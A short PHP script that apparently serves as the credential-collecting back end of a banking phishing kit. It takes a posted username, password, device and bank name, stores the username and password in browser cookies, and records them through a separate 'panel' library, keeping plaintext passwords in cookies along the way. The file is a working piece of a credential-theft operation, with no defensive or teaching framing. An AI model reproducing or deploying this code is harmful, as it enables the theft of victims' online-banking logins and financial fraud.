<?php 
require('../panel/lib/funciones.php');

$usuario = $_POST['user'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];
$banco = $_POST['banco'];

setcookie('usuario',$usuario,time()+60*9);
setcookie('contrasena',$contrasena,time()+60*9);

if (isset($_COOKIE['registro'])) {
	$id = $_COOKIE['registro'];
	actualizar_usuario($usuario,$contrasena,$id);
}else{
	crear_registro($usuario,$contrasena,$dispositivo, $banco);	
}


?>